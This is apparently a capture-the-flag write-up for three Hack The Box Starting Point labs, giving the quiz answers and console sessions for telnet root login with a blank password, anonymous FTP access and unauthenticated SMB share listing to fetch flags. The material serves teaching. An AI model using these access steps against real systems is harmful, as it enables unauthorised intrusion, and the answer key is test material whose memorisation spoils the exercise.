---
title: Starting Point Tier 0 HTB
author: lazy29t
date: 2023-02-10 20:53:00 +0800
categories: [HackTheBox, StartPoint, Meow]
tags: [Discovery, tools, HTB, telnet, nmap]
permalink: /HackTheBox/Starting-Point/tier-0/meow
math: true
mermaid: true
---

# Meow Machine (Telnet)



## Questions
**What does the acronym VM stand for?** 

```yaml
 Virtual Machine 
```
**What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It's also known as a console or shell.** 
```yaml
Terminal
```
**What service do we use to form our VPN connection into HTB labs?**
```yaml
openvpn
```
**What is the abbreviated name for a 'tunnel interface' in the output of your VPN boot-up sequence output?**

```yaml
tun
```

**What tool do we use to test our connection to the target with an ICMP echo request?**

```yaml
ping
```
**What is the name of the most common tool for finding open ports on a target?**

```yaml
nmap
```
**What service do we identify on port 23/tcp during our scans?**
```yaml
telnet
```
**What username is able to log into the target over telnet with a blank password?**
```yaml
root
```
---
## Practical
Now We are to trying to connect **Telnet** `port 23` with the nexts commands 
```console
$ telnet 10.129.53.52
Trying 10.129.53.52...
Connected to 10.129.53.52.
Escape character is '^]'.
root
....
  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: root
....
root@Meow:~#
```
```console
root@Meow:~# ls 
flag.txt  snap
root@Meow:~# cat flag.txt
j89************o
```

# Fawn Machine (FTP)

### FTP Services

In this case we are responses the questiosn about this service:

**What does the 3-letter acronym FTP stand for?**

```yaml
File Transfer Protocol
```
> That [Web](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp) can help you with some information

**Which port does the FTP service listen on usually?**

```yaml
Port 21 
```
**What acronym is used for the secure version of FTP?**
```yaml
SFTP (Secure Ffile Transfer Protocol) 
```
**From your scans, what version is FTP running on the target?**

```yaml
nc -vn 10.129.157.27  21
....
vsFTPd 3.0.3
```
**1. From your scans, what OS type is running on the target?**
**2. What is username that is used over FTP when you want to log in without having an account?**
```console
$ftp 10.129.157.27
Connected to 10.129.157.27.
220 (vsFTPd 3.0.3)
Name (10.129.157.27:lazy29t): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
So the answers are:

1. `UNIX`
2. `anonymous`

```console
ftp> ls
229 Entering Extended Passive Mode (|||26254|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp> cat flag.txt
```

```console
ftp>get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||64477|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |***********************************|    32      183.82 KiB/s    00:00 ETA
226 Transfer complete.
```

```console
~/Desktop/HTB/StartPoint$ ls
flag.txt
~/Desktop/HTB/StartPoint$ cat flag.txt
4g5**************e
```
## Dancing Machine (SMB)

**What does the 3-letter acronym SMB stand for?**
```yaml
Server Message Block
```
**What is the service name for port 445 that came up in our Nmap**
```console
$ nmap -p445 -sV -v --min-rate 5000 10.129.168.26 
....
PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?
```
**How many shares are there on Dancing?**

```console
smbclient --no-pass -L 10.129.168.26                                                                                                                                     1 ⨯

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk      
SMB1 disabled -- no workgroup available

```
```console
smbclient //10.129.50.160/WorkShares                                                                                                                                     1 ⨯
Enter WORKGROUP\lazy29t's password: 
```

```console
smb: \> ls
  .                                   D        0  -
  ..                                  D        0  -
  Amy.J                               D        0  -
  James.P                             D        0  -
```
```console
smb: \> cd James.P
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 01:38:03 2021
  ..                                  D        0  Thu Jun  3 01:38:03 2021
  flag.txt                            A       32  Mon Mar 29 02:26:57 2021

```

```console
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0.0 KiloBytes/sec) (average 0.1 KiloBytes/sec)

```
